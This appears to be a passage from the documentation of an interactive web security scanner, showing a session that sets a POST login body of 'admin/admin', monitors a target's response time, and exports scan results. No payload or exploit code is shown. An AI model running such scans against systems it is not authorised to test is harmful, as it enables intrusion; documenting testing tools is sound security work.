HTTP Method (GET/POST) [POST]: POST
POST Data [None]: username=admin&password=admin
Options saved. Returning to main menu...
```

```
[*] Monitoring target response time...

```

```
... (scan as in Example 1) ...
Export results to file? [Y/n]: Y
```
